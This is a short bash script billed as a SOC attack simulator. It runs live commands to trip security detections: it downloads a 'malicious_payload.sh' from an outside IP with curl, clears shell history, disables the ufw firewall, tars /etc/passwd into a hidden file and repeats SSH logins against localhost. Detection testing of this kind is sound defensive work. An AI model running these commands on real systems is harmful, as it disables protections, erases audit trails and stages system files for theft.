#!/bin/bash
echo '=================================================='
echo '       ABTECH SOC - AUTOMATED ATTACK SIMULATOR     '
echo '=================================================='
sleep 1

echo -e '
[ATTACK 1] Simulating Command & Control (C2) Download...'
curl -s -o /tmp/sys_update.sh http://80.xx.xx.xxx/malicious_payload.sh
sleep 2

echo -e '
[ATTACK 2] Simulating Defense Evasion & Log Tampering...'
history -c
sudo ufw disable 2>/dev/null
sleep 2

echo -e '
[ATTACK 3] Simulating Pre-Ransomware Data Staging...'
tar -czf /tmp/.staged_conf_backup.tar.gz /etc/passwd /etc/hosts 2>/dev/null
sleep 2

echo -e '
[ATTACK 4] Simulating SSH Brute Force (The Trigger)...'
for i in {1..8}; do ssh fakeadmin@localhost -o ConnectTimeout=1 2>/dev/null; done

echo -e '
=================================================='
echo '      ALL ATTACKS EXECUTED. CHECK YOUR SOC!      '
echo '=================================================='
